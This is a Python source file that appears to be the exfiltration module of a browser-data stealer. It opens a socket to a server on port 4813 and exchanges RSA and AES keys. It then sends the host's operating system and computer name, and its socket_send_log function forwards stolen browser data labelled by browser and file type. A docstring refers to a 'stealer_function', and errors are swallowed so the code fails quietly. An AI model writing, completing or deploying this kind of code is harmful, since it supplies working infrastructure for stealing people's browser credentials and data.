""" IMPORTS """
import sys
import json
import socket
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

from util.general import FORMAT, BITS_IN_BYTE


""" CONSTANTS """
SERVER_HOST = 'localhost'
SERVER_PORT = 4813
SERVER_ADDRESS = (SERVER_HOST, SERVER_PORT)

AES_KEY_SIZE = 128 // BITS_IN_BYTE
RSA_KEY_LEN_B64 = 600

socket_info = {
    'server': None,
    'rsa_cipher': None,
    'aes_key': b'',
}


def try_socket(socket_function):
    """ Decorator function which ignores Exceptions when calling stealer_function """
    def wrapper(*args, **kwargs):
        try:
            # Try calling socket_function
            socket_function(*args, **kwargs)
        except AttributeError as e:
            # Ignore errors related to no socket connection when sending
            if e != "'NoneType' object has no attribute 'send'":
                print(e)
        except Exception as e:
            # Ignore any Exceptions
            print(e)

    return wrapper


@try_socket
def socket_initialise() -> None:
    """ Creates socket connection with server """
    # Connect to server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect(SERVER_ADDRESS)
    socket_info['server'] = server
    print(f'[CONNECTED TO SERVER]: {SERVER_ADDRESS}')

    # Get RSA public key from server
    print('===== Starting key exchange =====')
    public_key = socket_recvall(server, RSA_KEY_LEN_B64)
    public_key = b64decode(public_key)
    print('✔️ Received RSA public key from server')

    # Create RSA cipher object from public key
    key = RSA.import_key(public_key)
    rsa_cipher = PKCS1_OAEP.new(key)
    socket_info['rsa_cipher'] = rsa_cipher

    # Generate AES key
    aes_key = get_random_bytes(AES_KEY_SIZE)
    socket_info['aes_key'] = aes_key

    # Encrypt AES key with RSA cipher and send back to server
    enc_aes_key = rsa_cipher.encrypt(aes_key)
    enc_aes_key = b64encode(enc_aes_key)
    server.send(enc_aes_key)
    print('✔️ Sent AES key to server')
    print('===== Key exchange complete =====')

    # Send client info to server using the AES key
    socket_send_message({
        'os': sys.platform,
        'computer': socket.gethostname(),
    })


def socket_recvall(server_socket, num_bytes: int):
    """ Wrapper function for socket recv method to receive the full num_bytes """
    received = b''
    while len(received) != num_bytes:
        missing = num_bytes - len(received)
        received += server_socket.recv(missing)
    return received


def socket_send_message(data: dict) -> None:
    """ Sends data to the socket server """
    # No socket connection
    server = socket_info['server']
    if not server:
        return

    # Encode and pad data
    encoded_data = json.dumps(data).encode(FORMAT)
    encoded_data = pad(encoded_data, AES.block_size)

    # Generate new nonce for AES cipher
    aes_key = socket_info['aes_key']
    nonce = get_random_bytes(AES_KEY_SIZE)
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce)

    # Encrypt data
    ciphertext = aes_cipher.encrypt(encoded_data)

    # Encrypt header with RSA public key and send to server
    rsa_cipher = socket_info['rsa_cipher']
    header = json.dumps({
        'ciphertext_length': len(ciphertext),
        'nonce': b64encode(nonce).decode(FORMAT),
    })
    encrypted_header = rsa_cipher.encrypt(header.encode(FORMAT))
    server.send(encrypted_header)

    # Send ciphertext to server
    print(f'Sent {len(ciphertext)} bytes')
    server.send(ciphertext)


@try_socket
def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
    """ Send log to socket server """
    socket_send_message({
        'browser': browser_name,
        'type': file_name,
        'data': data,
    })
